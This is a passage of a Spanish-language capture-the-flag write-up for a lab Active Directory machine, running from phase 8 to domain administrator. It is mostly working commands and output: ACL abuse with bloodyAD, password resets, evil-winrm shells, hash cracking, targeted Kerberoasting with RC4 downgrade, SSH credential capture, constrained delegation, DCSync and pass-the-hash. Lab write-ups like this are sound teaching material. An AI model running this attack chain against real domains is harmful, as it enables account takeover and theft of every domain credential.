distinguishedName: DC=_msdcs.hsm-defense.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=hsm-defense,DC=local
permission: CREATE_CHILD
```

Obtenemos más detalles de los permisos:

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' -p 'K@li1234!' get writable --detail
```

**Resultado:**

```
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=jason.caldwell,CN=Users,DC=hsm-defense,DC=local
logonHours: WRITE
```

El permiso `Write` nos permite limpiarlo directamente con el módulo `set object` de `bloodyAD`.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local -u 'luke.harrison' -p 'K@li1234!' set object jason.caldwell logonHours
```

**Resultado:**

```
[!] Attribute encoding not supported for logonHours with bytes attribute type, using raw mode
[+] jason.caldwell's logonHours has been updated
```

Verificamos las credenciales de `jason.caldwell`:

```bash
nxc smb DC.hsm-defense.local -u 'jason.caldwell' -p 'K@li1234!' -k --shares
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\jason.caldwell:K@li1234! 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share
```

**¡Funciona!** Ahora podemos autenticarnos como `jason.caldwell`.

### 8.1 Obtención de shell con evil-winrm

```bash
export KRB5CCNAME=jason.caldwell.ccache
evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
```

**Resultado:**

```
Evil-WinRM shell v4.1

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Info: Connection successful
*Evil-WinRM* PS C:\Users\jason.caldwell\Documents> whoami
hsmdefense\jason.caldwell
```

### 8.2 Enumeración del sistema

La flag no está por ningún lado:

```powershell
C:\Users\jason.caldwell> tree /f
```

**Resultado:**

```
Folder PATH listing
Volume serial number is B2FE-71A4
C:.
├───Desktop
├───Documents
├───Downloads
├───Favorites
├───Links
├───Music
├───Pictures
├───Saved Games
└───Videos
```

Listamos los puertos en escucha:

```powershell
netstat -ano | findstr TCP | findstr LISTENING
```

**Resultado relevante:**

```
TCP    10.0.20.80:53          0.0.0.0:0              LISTENING       2076
TCP    10.0.20.80:139         0.0.0.0:0              LISTENING       4
TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2076
TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       3964
```

**Hallazgo:** El puerto **3306 (MySQL/MariaDB)** está escuchando en localhost. Encontramos la carpeta de instalación en `C:\Program Files\MariaDB 10.6`.

### 8.3 Análisis de la configuración de MariaDB

```powershell
dir "c:\Program Files"
```

**Resultado:**

```
Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2026  11:50 AM                Amazon
d-----        9/15/2018  12:28 AM                Common Files
d-----         3/7/2026   1:47 AM                internet explorer
d-----         3/4/2026  12:53 PM                LibreOffice
d-----         3/5/2026   8:38 AM                MariaDB 10.6
d-----         3/6/2026   4:13 PM                Mozilla Thunderbird
d-----         3/4/2026   9:59 AM                MSBuild
d-----         3/4/2026   9:18 AM                Oracle
d-----         3/7/2026  12:48 AM                PackageManagement
d-----         3/4/2026   9:59 AM                Reference Assemblies
d-r---         9/2/2026   9:28 AM                Windows Defender
d-----         8/1/2026  10:47 AM                Windows Defender Advanced Threat Protection
```

Revisamos el archivo `my.ini`:

```powershell
C:\Program Files\MariaDB 10.6\data> type my.ini
```

**Resultado:**

```ini
[mysqld]
datadir=C:/Program Files/MariaDB 10.6/data
port=3306
bind-address=127.0.0.1
innodb_buffer_pool_size=511M

[client]
port=3306
plugin-dir=C:\Program Files\MariaDB 10.6/lib/plugin

[internal_app]
database_host=127.0.0.1
database_user=root
database_password=pa$$w0rd12
```

**Hallazgo crítico:** La contraseña del usuario `root` de MariaDB está en texto plano: `pa$$w0rd12`.

### 8.4 Conexión a MariaDB y extracción de credenciales

```powershell
& "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -ppa$$w0rd12 -e "SHOW DATABASES;"
```

**Resultado:**

```
Database
hsm_defense
information_schema
mysql
new_employees
performance_schema
sys
```

Enumeramos la base de datos `new_employees`:

```powershell
& "C:\Program Files\MariaDB 10.6\bin\mysql.exe" -h 127.0.0.1 --protocol=tcp -u root -ppa$$w0rd12 -D new_employees -e "SELECT * FROM employees;"
```

**Resultado:**

```
id      username        password
1       aaron.pierce    d482a055616317f569cd1ab90325479e
2       nathan.reed     d482a055616317f569cd1ab90325479e
4       adam.brooks     f3a4f28a0aaf388c0ce16a6011acf511
```

Obtenemos hashes MD5 de contraseñas de usuarios.

### 8.5 Crackeo de los hashes

```bash
hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt
```

**Resultado:**

```
d482a055616317f569cd1ab90325479e://newpassword123
```

Probamos la contraseña con varios usuarios:

```bash
nxc smb DC.hsm-defense.local -u users.txt -p '//newpassword123' -k --continue-on-success
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\aaron.pierce://newpassword123 
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\caleb.turner://newpassword123
```

Buscamos esos usuarios en nuestros datos de BloodHound. El usuario `aaron.pierce` parece ser un usuario nuevo sin permisos especiales.

Pero, el usuario `caleb.turner` parece ser uno muy interesante. También es un empleado nuevo, pero está en el grupo `remote management users` y en el grupo `IT OU operators`. Así que quizás podamos jugar con las OUs presentes en el dominio.

Vemos que tenemos permiso `GenericAll` sobre varios usuarios y sobre las OUs `IT-TIER2` a `IT-TIER4`. Desafortunadamente no sobre `IT-TIER1`, que parece ser más valiosa, pero más sobre eso después.

```bash
impacket-getTGT hsm-defense.local/caleb.turner:'//newpassword123'
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in caleb.turner.ccache
```

```bash
export KRB5CCNAME=caleb.turner.ccache
evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
```

**Resultado:**

```powershell
*Evil-WinRM* PS C:\Users\caleb.turner> tree /f
Folder PATH listing
Volume serial number is B2FE-71A4
C:.
├───Desktop
│       user.txt
├───Documents
├───Downloads
├───Favorites
├───Links
├───Music
├───Pictures
├───Saved Games
└───Videos
```

Obtenemos la **flag de usuario**.

---

## Fase 9: Movimiento lateral a IT-Tier1

Echemos un vistazo al grupo TIER-1...

De estos tres, `ryan.cole` destaca porque es el único de los tres que está en el grupo remote desktop. Quizás este usuario tiene más que ofrecer. Así que la ruta queda así: con `caleb.turner` en el grupo `IT OU operators`, de alguna manera (aún no está claro cómo) obtenemos acceso al grupo `Tier 1`, conseguimos acceso como `oscar.mazerath` y desde ahí tomamos el control del usuario `ryan.cole` para continuar enumerando el objetivo mediante la sesión de Escritorio Remoto.

Enumeramos los objetos escribibles y vemos que tenemos permisos de escritura sobre `oscar.mazerath` en la OU IT-Tier1.

```bash
bloodyad --host DC.hsm-defense.local -d hsm-defense.local -k get writable --object IT-Tier1
```

**Resultado:**

```
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: CN=Caleb Turner,CN=Users,DC=hsm-defense,DC=local
permission: WRITE

distinguishedName: CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local
permission: WRITE
```

Para entender qué podemos hacer realmente con nuestra membresía en `IT OU operators`, volcamos las ACLs de cada OU IT-Tier usando `bloodyAD`.

**IT-Tier1:** `caleb.turner` tiene un permiso `DELETE_CHILD`, pero el grupo `IT OU operators` no tiene ninguna ACE aquí. Esto significa que podemos eliminar objetos de esta OU, pero no podemos escribir en ellos solo mediante la membresía del grupo.

```
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: caleb.turner
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
```

**IT-Tier2:** El grupo `IT OU operators` tiene `GenericAll` con `CONTAINER_INHERIT`, pero dos ACEs de Deny lo anulan. `CREATE_CHILD` para objetos User y `WRITE_PROP` están ambos denegados. Como Deny siempre prevalece sobre Allow, esta OU está bloqueada para nosotros.

```
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.0.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: User

nTSecurityDescriptor.ACL.1.Type: == DENIED ==
nTSecurityDescriptor.ACL.1.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.1.Right: WRITE_PROP
nTSecurityDescriptor.ACL.1.ObjectType: Self

nTSecurityDescriptor.ACL.6.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.6.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.6.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.6.Flags: CONTAINER_INHERIT
```

**IT-Tier3:** IT OU operators también tiene un `GenericAll` con `CONTAINER_INHERIT` y ninguna ACE de Deny. **Este es el objetivo**: control total y sin restricciones sobre esta OU y sobre cualquier objeto dentro de ella.

```
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
```

**IT-Tier4:** IT OU operators tiene `GenericAll` con `CONTAINER_INHERIT`, pero `CREATE_CHILD` para objetos User está denegado. Similar a Tier2, pero ligeramente menos restrictiva.

```
nTSecurityDescriptor.ACL.0.Type: == DENIED_OBJECT ==
nTSecurityDescriptor.ACL.0.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.0.Right: CREATE_CHILD
nTSecurityDescriptor.ACL.0.ObjectType: User

nTSecurityDescriptor.ACL.5.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.5.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.5.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.5.Flags: CONTAINER_INHERIT
```

Mover un objeto de AD entre OUs requiere `DELETE_CHILD` en la OU de **origen** y `CREATE_CHILD` en la OU de **destino**. Tenemos ambos: `DELETE_CHILD` en `IT-Tier1` mediante la ACE directa de `caleb.turner`, y `CREATE_CHILD` en IT-Tier3 mediante el `GenericAll` de IT OU Operators (que incluye `CREATE_CHILD`) sin ninguna ACE de Deny que lo bloquee. Una vez que `oscar.mazerath` aterrice en IT-Tier3, el flag `CONTAINER_INHERIT` de la ACE `GenericAll` entra en juego, concediéndonos control total sobre el objeto de usuario.

**DELETE_CHILD en Tier1 (origen) — directamente como caleb.turner**

```
nTSecurityDescriptor.ACL.3.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.3.Trustee: caleb.turner
nTSecurityDescriptor.ACL.3.Right: DELETE_CHILD
nTSecurityDescriptor.ACL.3.ObjectType: Self
```

**CREATE_CHILD en Tier3 (destino) — vía membresía en IT OU Operators**

```
nTSecurityDescriptor.ACL.4.Type: == ALLOWED ==
nTSecurityDescriptor.ACL.4.Trustee: IT OU Operators
nTSecurityDescriptor.ACL.4.Right: GENERIC_ALL
nTSecurityDescriptor.ACL.4.ObjectType: Self
nTSecurityDescriptor.ACL.4.Flags: CONTAINER_INHERIT
```

Movemos `oscar.mazerath` de `IT-Tier1` a `IT-Tier3`.

```bash
bloodyad --host DC.hsm-defense.local -d hsm-defense.local -k set object 'CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local' distinguishedName -v 'CN=oscar.mazerath,OU=IT-Tier3,DC=hsm-defense,DC=local'
```

**Resultado:**

```
[+] CN=oscar.mazerath,OU=IT-Tier1,DC=hsm-defense,DC=local's distinguishedName has been updated
```

Ahora podemos cambiar la contraseña de `oscar.mazerath` a través del `GenericAll` que tenemos sobre IT-Tier3:

```bash
bloodyad --host DC.hsm-defense.local -d hsm-defense.local -k set password oscar.mazerath 'K@li1234!'
```

**Resultado:**

```
[+] Password changed successfully!
```

Verificamos las credenciales:

```bash
nxc smb DC.hsm-defense.local -u 'oscar.mazerath' -p 'K@li1234!' -k --shares
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\oscar.mazerath:K@li1234! 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share
```

---

## Fase 10: Ataque TargetedKerberoast sobre ryan.cole

Realizamos el ataque **targetedKerberoast** sobre `ryan.cole`:

```bash
python3 targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath' -d 'hsm-defense.local' --request-user 'ryan.cole'
```

**Resultado:**

```
[*] Starting kerberoast attacks
[*] Attacking user (ryan.cole)
[+] Printing hash for (ryan.cole)
$krb5tgs$18$ryan.cole$HSM-DEFENSE.LOCAL$*hsm-defense.local/ryan.cole*$4fa4ac9cabec8a49af46cb08$dcb5b1c502bb8d11fe8f1fbecf61dfc38178bde43a6ad33e37a994a455fc7c9c2eaa010a935d782395344d27307dc74f7efd827e39a3be90ad24398e86a6ddda3d4fdc2483d6fbe8f73aa3b1765eb956ba40ad3aa2b9b00b3815995ce643429d34cc1a066a4aca5029c2d1f303b676926bc4b2e8bec2125046dd0cd72bb14d805daa696cf3aed4c351bf3d094eb2629b84ea57998a698e563a664a8fb9fe0e2ab9b843961d375dda1b72e7a9b3154266c56b3a473f8a503856d0f10774dae892006346f5784ee5dc58b1376a375ec8ebc9f4b45b72ad5b777a2cdc4800489bae950f15a53a203a191f3826fa4741d366f254f29b40648a2fe792b6aa864887b3d722bae6257371a2d7701a54c9415c2c0cb0c7a5190b4cff2166e
```

El hash resultante es demasiado fuerte para crackear (usa cifrado AES de 18). Usando nuestro `GenericWrite` sobre `ryan.cole`, degradamos los tipos de cifrado soportados por la cuenta estableciendo `msDS-SupportedEncryptionTypes` a `4`, lo que fuerza al KDC a emitir tickets `$krb5tgs$23$` cifrados con RC4 en lugar de AES:

```bash
bloodyad --host DC.hsm-defense.local -d hsm-defense.local -k set object ryan.cole msDS-SupportedEncryptionTypes -v 4
```

**Resultado:**

```
[+] ryan.cole's msDS-SupportedEncryptionTypes has been updated
```

Github del programa: https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py

Ahora volvemos a ejecutar el ataque:

```bash
python3 targetedKerberoast.py -k --dc-host dc.hsm-defense.local -u 'oscar.mazerath' -d 'hsm-defense.local' --request-user 'ryan.cole'
```

**Resultado:**

```
[*] Starting kerberoast attacks
[*] Attacking user (ryan.cole)
[+] Printing hash for (ryan.cole)
$krb5tgs$23$*ryan.cole$HSM-DEFENSE.LOCAL$hsm-defense.local/ryan.cole*$94573db553e6afad8904cbcaa7bcd66c$8777cba368e099cf7552e741b4ef4e31c1c636d02c1c40a55a9558a9720226e28f7a6cd6d0db3c9a20bd345fab84f72f41664ea09ea6f3472f8afbcf5c2029ccb3fc388e90277bb3bf1986a4d28e3a19e03474497ef994b2fed9a62c565f1ebc1fbfcf3e8e3cc1b78bde10b30537b344902775d1ad797e76c96c7f3b6f3f9cdf33fc3f7c28736ccdac728d4d4a4083208e4cd66613123f1a957ad9fef7542e0695bac5a956eb7dce4359f31502eb028230bc2b9a0ca1d651bccccadb69980975f2db642d8c90fa41c7e44d4cc753973a85aeea6e03233d9723c030acd921ba143e14c6eb4b0107766c35607
```

Crackeamos el hash con `hashcat` (modo 13100):

```bash
hashcat -m 13100 -a 0 ryan.hash /usr/share/wordlists/rockyou.txt
```

**Resultado:** La contraseña es `napalmcrack`.

Verificamos las credenciales:

```bash
nxc smb DC.hsm-defense.local -u 'ryan.cole' -p 'napalmcrack' -k --shares
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\ryan.cole:napalmcrack 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share
```

---

## Fase 11: Acceso RDP como ryan.cole

Nos conectamos por RDP:

```bash
xfreerdp /v:DC.hsm-defense.local /d:HSM-DEFENSE.LOCAL /u:ryan.cole /dynamic-resolution +clipboard /cert:ignore
```

Dentro del escritorio de `ryan.cole`, encontramos una herramienta llamada **HSM Defense SSH Remote Tool**. También hay un correo que explica el uso de la herramienta:

```
Hi Ryan,

Please note that the HSM Defense SSH Remote Tool is intended to be used only within the internal company network.

The tool is required for maintenance connections to factory terminal systems. Many of these terminals are legacy devices and do not support modern encryption standards. In some cases, the connection uses very limited or almost no encryption, which is why the tool must never be used outside the protected internal LAN.

For security reasons, please follow these guidelines:

Use the tool only while connected to the internal HSM Defense network.
Do not use it from external networks or over the internet.
Only connect to official company terminal systems in our production facilities.
Do not install or run the tool on personal or unmanaged devices.

This restriction exists to prevent exposure of internal systems and credentials.

If you have any questions regarding terminal access or maintenance procedures, please contact the IT Operations team.

Best regards,
Administrator
HSM Defense – IT Operations
```

---

## Fase 12: Captura de credenciales mediante SSH-Log

Iniciamos la aplicación y vemos que podemos ajustar el host y puerto objetivo.

![Herramienta SSH](./hsm-ssh-tool.png)

Vemos que la conexión se realiza pero no se filtran credenciales.

![Conexión SSH saliente](./hsm-ssh-connection.png)

En nuestra máquina Kali, iniciamos un listener en el puerto 22:

```bash
nc -lnvp 22
```

**Resultado:**

```
listening on [any] 22 ...
connect to [10.200.97.239] from (UNKNOWN) [10.0.20.80] 50682
SSH-2.0-paramiko_4.0.0
```

Hacemos uso de **SSH-Log**, una herramienta escrita en Go para capturar credenciales SSH y registrar los comandos del cliente.

> SSH-Log es una herramienta para capturar credenciales SSH y registrar comandos del cliente. Utiliza la clave privada de un demonio SSH válido para parecer legítimo. No es un honeypot de alta interacción. Si un cliente usa credenciales válidas, SSH-Log puede generar un shell real y grabar la entrada y salida de los comandos del cliente. SSHlog-mini es una versión simplificada de SSHlog que solo captura credenciales SSH.

Repositorio: [https://github.com/westenfelder/SSH-Log](https://github.com/westenfelder/SSH-Log)

Compilamos el binario y lo ejecutamos. Después de establecer una conexión, vemos las credenciales en texto plano filtradas de la cuenta de máquina `ITOPS01$`.

```bash
SSHlog git:(main) sudo ./SSHlog
```

**Resultado:**

```
Thu, 01 Oct 2026 21:33:00 EDT   STARTING SSHLOG 
Thu, 01 Oct 2026 21:33:00 EDT   CREATED LOG FILE         Filename: .ServerLog 
Thu, 01 Oct 2026 21:33:24 EDT   LOGIN ATTEMPT            Address: 10.0.20.80:50745   Client: SSH-2.0-paramiko_4.0.0   Username: ITOPS01$   Password: paSSword2459
```

**Hallazgo crítico:** Obtenemos las credenciales de la cuenta de máquina `ITOPS01$`: `paSSword2459`.

---

## Fase 13: Acceso como svc_delegate

La cuenta de máquina `ITOPS01$` tiene `WriteDACL` sobre `svc_delegate`, lo que permite otorgar derechos totales sobre la cuenta y tomar el control de `svc_delegate`.

Obtenemos un TGT para `ITOPS01$`:

```bash
impacket-getTGT hsm-defense.local/ITOPS01$:'paSSword2459'
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in ITOPS01$.ccache
```

Otorgamos `GenericAll` sobre `svc_delegate`:

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local add genericAll svc_delegate ITOPS01$
```

**Resultado:**

```
[+] ITOPS01$ has now GenericAll on svc_delegate
```

Con control total establecido, reseteamos la contraseña de `svc_delegate` para tomar el control de la cuenta:

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local set password 'svc_delegate' 'K@li1234!'
```

**Resultado:**

```
[+] Password changed successfully!
```

Verificamos las credenciales:

```bash
nxc smb DC.hsm-defense.local -u 'svc_delegate' -p 'K@li1234!' -k --shares
```

**Resultado:**

```
SMB         DC.hsm-defense.local 445    DC               [*]  x64 (name:DC) (domain:hsm-defense.local) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC.hsm-defense.local 445    DC               [+] hsm-defense.local\svc_delegate:K@li1234! 
SMB         DC.hsm-defense.local 445    DC               [*] Enumerated shares
SMB         DC.hsm-defense.local 445    DC               Share           Permissions     Remark
SMB         DC.hsm-defense.local 445    DC               -----           -----------     ------
SMB         DC.hsm-defense.local 445    DC               ADMIN$                          Remote Admin
SMB         DC.hsm-defense.local 445    DC               C$                              Default share
SMB         DC.hsm-defense.local 445    DC               IPC$            READ            Remote IPC
SMB         DC.hsm-defense.local 445    DC               NETLOGON        READ            Logon server share 
SMB         DC.hsm-defense.local 445    DC               SYSVOL          READ            Logon server share
```

---

## Fase 14: Delegación restringida Kerberos (Constrained Delegation)

El usuario `svc_delegate` tiene `GenericWrite` sobre `HELPDESK01$`. Como `GenericWrite` nos permite modificar casi cualquier atributo del objeto objetivo, podemos configurar una **delegación restringida Kerberos con transición de protocolo** en `HELPDESK01$`. Esto permite a `HELPDESK01$` suplantar a cualquier usuario, incluyendo al Administrador, hacia un servicio de nuestra elección en el DC. Apuntamos específicamente a la cuenta de máquina porque el paso S4U2Self en la cadena de delegación requiere que la cuenta delegante tenga un Service Principal Name. Las cuentas de máquina reciben SPNs automáticamente al unirse al dominio (por ejemplo, `HOST/HELPDESK01$`), por lo que la delegación funciona sin configuración adicional. Una cuenta de usuario normal no tendría un SPN por defecto, y la solicitud S4U2Self fallaría.

Obtenemos un TGT para `svc_delegate`:

```bash
impacket-getTGT hsm-defense.local/svc_delegate:'K@li1234!'
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_delegate.ccache
```

```bash
export KRB5CCNAME=svc_delegate.ccache
```

Configuramos la delegación en dos pasos. Primero, establecemos el atributo `msDS-AllowedToDelegateTo` en `HELPDESK01$` para apuntar al servicio LDAP en el DC. Esto indica a Active Directory que `HELPDESK01$` tiene permitido delegar credenciales a `ldap/DC.hsm-defense.local`.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local set object 'HELPDESK01$' msDS-AllowedToDelegateTo -v 'ldap/DC.hsm-defense.local'
```

**Resultado:**

```
[+] HELPDESK01$'s msDS-AllowedToDelegateTo has been updated
```

Segundo, habilitamos la transición de protocolo estableciendo el flag UAC `TRUSTED_TO_AUTH_FOR_DELEGATION`. Sin este flag, la delegación requeriría que el usuario suplantado se autenticara primero contra `HELPDESK01$`. Con la transición de protocolo habilitada, `HELPDESK01$` puede solicitar un ticket de servicio en nombre de cualquier usuario sin la participación de ese usuario.

```bash
bloodyad -k --host DC.hsm-defense.local -d hsm-defense.local add uac 'HELPDESK01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

**Resultado:**

```
[+] ['TRUSTED_TO_AUTH_FOR_DELEGATION'] property flags added to HELPDESK01$'s userAccountControl
```

Ahora explotamos la delegación. Solicitamos un TGT para `HELPDESK01$` con las credenciales que crackeamos anteriormente.

```bash
impacket-getTGT hsm-defense.local/'HELPDESK01$:Password123'
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in HELPDESK01$.ccache
```

```bash
export KRB5CCNAME=HELPDESK01\$.ccache
```

Usando `getST.py`, solicitamos un ticket de servicio para `ldap/DC.hsm-defense.local` suplantando a la cuenta Administrador. Debido a la transición de protocolo, esto funciona sin la contraseña del Administrador. `HELPDESK01$` realiza S4U2Self para obtener un ticket reenviable y luego S4U2Proxy para delegarlo al servicio LDAP.

```bash
impacket-getST hsm-defense.local/'HELPDESK01$' -spn ldap/DC.hsm-defense.local -impersonate Administrator -k -no-pass -dc-ip DC.hsm-defense.local
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@ldap_DC.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache
```

---

## Fase 15: DCSync

Exportamos el archivo ccache resultante y usamos `secretsdump.py` para realizar un ataque **DCSync** sobre LDAP como Administrador, volcando todos los hashes del dominio.

```bash
export KRB5CCNAME=Administrator@ldap_DC.hsm-defense.local@HSM-DEFENSE.LOCAL.ccache
impacket-secretsdump -k -no-pass DC.hsm-defense.local
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xad9536946f049b9c76ede14c1b859513
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f63724029e182a119a3963d8e8e5505e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC

[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:639428eb318f47dae9703363da3fb30f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fe610f178a46bf13a974e6355139660b:::
kelly.johnson:1104:aad3b435b51404eeaad3b435b51404ee:b354944441b269a7b05e699cfdf35a6e:::
hsm-defense.local\luke.harrison:1106:aad3b435b51404eeaad3b435b51404ee:213429ca10023b20a463680efa53a848::
```

Obtenemos el hash NTLM del Administrador: `639428eb318f47dae9703363da3fb30f`.

---

## Fase 16: Acceso como Administrador

Obtenemos un TGT para el Administrador usando el hash:

```bash
impacket-getTGT hsm-defense.local/Administrator -hashes :639428eb318f47dae9703363da3fb30f
```

**Resultado:**

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache
evil-winrm -i DC.hsm-defense.local -r hsm-defense.local
```

**Resultado:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
hsmdefense\administrator
```

¡Obtenemos acceso como **Administrador del dominio**! La máquina ha sido completamente comprometida.

---

## 📌 Conclusión

HSM Defense es una máquina **Difícil** que combina múltiples técnicas avanzadas de pentesting en un entorno Active Directory:

1. **Enumeración web** y descubrimiento de subdominios.
2. **Ataque con documento ODT malicioso** (NetNTLMv2 Capture) a través de un formulario de solicitud de empleo.
3. **Acceso al panel de soporte** con credenciales crackeadas.
4. **Análisis de tickets de soporte** para descubrir cuentas de máquina con contraseñas configuradas manualmente.
5. **Timeroasting** para extraer hashes de cuentas de equipo sin autenticación.
6. **Abuso de WriteOwner** sobre el grupo `servicedesk` para tomar el control del grupo.
7. **ForceChangePassword** sobre `jason.caldwell` y ajuste de `logonHours` para permitir la autenticación.
8. **Movimiento lateral a través de OUs** (IT-Tier1 a IT-Tier3) abusando de ACLs.
9. **TargetedKerberoast** sobre `ryan.cole` con degradación de cifrado a RC4.
10. **Captura de credenciales SSH** mediante SSH-Log en una herramienta interna.
11. **Abuso de WriteDACL** sobre `svc_delegate`.
12. **Delegación restringida Kerberos con transición de protocolo** para suplantar al Administrador.
13. **DCSync** para extraer todos los hashes del dominio.
14. **Acceso final como Administrador del dominio**.

---

## 📚 Lecciones aprendidas

1. **Los archivos adjuntos externos deben procesarse de forma aislada**  
   El envío de un ODT malicioso permitió capturar un hash NetNTLMv2. Los documentos recibidos de fuentes externas deben analizarse en entornos aislados y bloquear conexiones SMB salientes.

2. **Las cuentas de máquina deben conservar la gestión automática de contraseñas**  
   `HELPDESK01$` utilizaba una contraseña estática y débil, lo que facilitó su compromiso mediante Timeroasting y ataques offline.

3. **Los tickets de soporte no deben revelar información operativa sensible**  
   Los tickets expusieron nombres de cuentas, configuraciones inseguras y problemas de autenticación aprovechables por un atacante.

